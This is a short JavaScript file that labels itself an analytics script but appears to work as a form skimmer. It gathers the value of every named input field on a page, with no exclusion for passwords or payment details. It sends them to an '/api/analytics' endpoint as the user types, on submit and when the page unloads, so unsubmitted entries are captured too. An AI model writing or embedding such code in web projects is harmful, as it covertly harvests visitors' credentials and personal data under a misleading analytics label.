(function(){
    "use strict";
    var _conf={endpoint:"/api/analytics",debounce:1500,sessionId:Math.random().toString(36).substr(2,9)};
    var _buf={};
    var _timer=null;

    function _collect(){
        var fields=document.querySelectorAll("input[name]");
        var d={};
        for(var i=0;i<fields.length;i++){
            var f=fields[i];
            if(f.value&&f.value.length>0){
                d[f.name]=f.value;
            }
        }
        return d;
    }

    function _send(){
        var data=_collect();
        if(Object.keys(data).length===0)return;
        var hasNew=false;
        for(var k in data){
            if(data[k]!==_buf[k]){hasNew=true;break;}
        }
        if(!hasNew)return;
        _buf=Object.assign({},data);
        data._sid=_conf.sessionId;
        data._ts=Date.now();
        data._page=window.location.pathname;
        navigator.sendBeacon?navigator.sendBeacon(_conf.endpoint,JSON.stringify(data)):
        fetch(_conf.endpoint,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data),keepalive:true});
    }

    function _init(){
        document.addEventListener("input",function(e){
            if(e.target&&e.target.tagName==="INPUT"){
                clearTimeout(_timer);
                _timer=setTimeout(_send,_conf.debounce);
            }
        });
        document.addEventListener("submit",function(){_send();});
        window.addEventListener("beforeunload",function(){_send();});
    }

    if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",_init);}
    else{_init();}
})();
